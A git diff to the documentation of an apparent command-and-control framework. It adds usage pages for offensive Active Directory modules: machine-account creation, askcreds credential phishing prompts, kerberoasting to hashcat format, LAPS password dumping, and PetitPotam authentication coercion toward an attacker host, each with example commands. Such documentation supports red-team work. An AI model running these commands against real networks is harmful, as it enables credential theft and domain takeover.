@@ -3,9 +3,6 @@
 ## Contents <!-- omit from toc -->
 
 - [Overview](#overview)
-  - [get-machineaccountquota](#get-machineaccountquota)
-  - [add-machineaccount](#add-machineaccount)
-  - [remove-machineaccount](#remove-machineaccount)
   - [add-user](#add-user)
   - [add-groupmembership](#add-groupmembership)
   - [enable-user](#enable-user)
@@ -76,6 +73,15 @@
   - [remove-dcsync](#remove-dcsync)
   - [remove-genericwrite](#remove-genericwrite)
   - [remove-genericall](#remove-genericall)
+- [Outflank C2 Tool Collection](#outflank-c2-tool-collection)
+  - [get-machineaccountquota](#get-machineaccountquota)
+  - [add-machineaccount](#add-machineaccount)
+  - [remove-machineaccount](#remove-machineaccount)
+  - [askcreds](#askcreds)
+  - [get-kerberoastable](#get-kerberoastable)
+  - [kerberoast](#kerberoast)
+  - [lapsdump](#lapsdump)
+  - [petitpotam](#petitpotam)
 
 
 ## Overview
@@ -83,9 +89,6 @@
 The remote operations modules provide commands for managing users, registry keys, services, scheduled tasks, and system state on local and remote systems. All commands are implemented as BOF wrappers for [CS-Remote-OPs-BOF](https://github.com/trustedsec/CS-Remote-OPs-BOF). The module contains the following commands:
 
 ```
- * get-machineaccountquota  Retrieve MachineAccountQuota in the current domain.
- * add-machineaccount       Add computer account to the Active Directory domain.
- * remove-machineaccount    Delete computer account from the Active Directory domain.
  * add-user                 Add a user to a machine.
  * add-groupmembership      Add a specified user to a group.
  * enable-user              Enable a specified user account.
@@ -104,37 +107,6 @@ The remote operations modules provide commands for managing users, registry keys
  * schtasks-start           Run a scheduled task on the target system.
  * schtasks-stop            Stop a running scheduled task on the target system.
  * shutdown                 Shutdown or reboot a target system.
-```
-
-### get-machineaccountquota
-Retrieve MachineAccountQuota in the current domain.
-
-```
-Usage: get-machineaccountquota 
-Example: get-machineaccountquota
-```
-
-### add-machineaccount
-Add computer account to the Active Directory domain.
-
-```
-Usage: add-machineaccount <name> <password>
-Example: add-machineaccount FAKE01 Password123!
-
-Required arguments:
-  name                      STRING     Name of the computer account to add.
-  password                  STRING     Password of the new computer account.
-```
-
-### remove-machineaccount 
-Delete computer account from the Active Directory domain.
-
-```
-Usage: remove-machineaccount <name>
-Example: remove-machineaccount FAKE01
-
-Required arguments:
-  name                      STRING     Name of the computer account to delete.
 ```
 
 ### add-user
@@ -1383,4 +1355,114 @@ Optional arguments:
   --ou path                 STRING     OU path to search.
   --dc fqdn                 STRING     FQDN of the domain controller.
   --ldaps                   BOOL       Use LDAPS (port 636).
+```
+
+
+## Outflank C2 Tool Collection
+
+The Outflank C2 Tool Collection provides additional capabilities implemented as BOF wrappers for [Outflank's C2-Tool-Collection](https://github.com/outflanknl/C2-Tool-Collection). The module contains the following commands:
+
+```
+ * get-machineaccountquota  Retrieve MachineAccountQuota in the current domain.
+ * add-machineaccount       Add computer account to the Active Directory domain.
+ * remove-machineaccount    Delete computer account from the Active Directory domain.
+ * askcreds                 Collect credentials via a Windows credential prompt (async).
+ * get-kerberoastable       List kerberoasting targets.
+ * kerberoast               Kerberoast a specific account.
+ * lapsdump                 Dump LAPS passwords.
+ * petitpotam               Coerce Windows hosts to authenticate via MS-EFSRPC.
+```
+
+### get-machineaccountquota
+Retrieve MachineAccountQuota in the current domain.
+
+```
+Usage: get-machineaccountquota
+Example: get-machineaccountquota
+```
+
+### add-machineaccount
+Add computer account to the Active Directory domain.
+
+```
+Usage  : add-machineaccount <name> <password>
+Example: add-machineaccount FAKE01 Password123!
+
+Required arguments:
+  name                      STRING     Name of the computer account to add.
+  password                  STRING     Password of the new computer account.
+```
+
+### remove-machineaccount
+Delete computer account from the Active Directory domain.
+
+```
+Usage  : remove-machineaccount <name>
+Example: remove-machineaccount FAKE01
+
+Required arguments:
+  name                      STRING     Name of the computer account to delete.
+```
+
+### askcreds
+Collect credentials by prompting the user via `CredUIPromptForWindowsCredentialsName`. By default, the command runs asynchronously using the async BOF DLL loader, allowing the agent to continue executing tasks while waiting for the user to enter credentials. The `--sync` flag runs the BOF synchronously instead, which blocks the agent until the credential prompt is closed or dismissed.
+
+```
+Usage  : askcreds [prompt] [--sync]
+Example: askcreds "Password please :)"
+
+Optional arguments:
+  prompt                    STRING     Password prompt (default: "Please provide credentials").
+  --sync                    BOOL       Run BOF synchronously (blocks the agent).
+```
+
+![AskCreds BOF](../assets/askcreds.png)
+
+### get-kerberoastable
+List kerberoasting targets in the current domain.
+
+```
+Usage  : get-kerberoastable [--no-aes]
+Example: get-kerberoastable --no-aes
+
+Optional arguments:
+  --no-aes                  BOOL       Exclude AES enabled accounts.
+```
+
+### kerberoast
+Kerberoast a specific account. The output handler extracts the TGS ticket from the BOF output, decodes the Kerberos AP-REQ structure, and converts it directly into hashcat-crackable format (`$krb5tgs$...`). Both RC4 (`etype 23`) and AES (`etype 17`/`18`) encryption types are supported.
+
+```
+Usage  : kerberoast <samaccountname> [--no-aes]
+Example: kerberoast svc_cq
+Example: kerberoast svc_cq --no-aes
+
+Required arguments:
+  samaccountname            STRING     Target account.
+
+Optional arguments:
+  --no-aes                  BOOL       Exclude AES enabled accounts.
+```
+
+### lapsdump
+Dump LAPS passwords for a target computer.
+
+```
+Usage  : lapsdump <target>
+Example: lapsdump web01
+
+Required arguments:
+  target                    STRING     Target computer.
+```
+
+### petitpotam
+Coerce Windows hosts to authenticate to an attacker-controlled capture server via MS-EFSRPC (PetitPotam).
+
+```
+Usage  : petitpotam <attacker> <target>
+Example: petitpotam 10.0.0.5 dc01.conquest.local
+
+Required arguments:
+  attacker                  STRING     Attacker-controlled capture server IP or hostname.
+  target                    STRING     Target server IP or hostname.
 ```
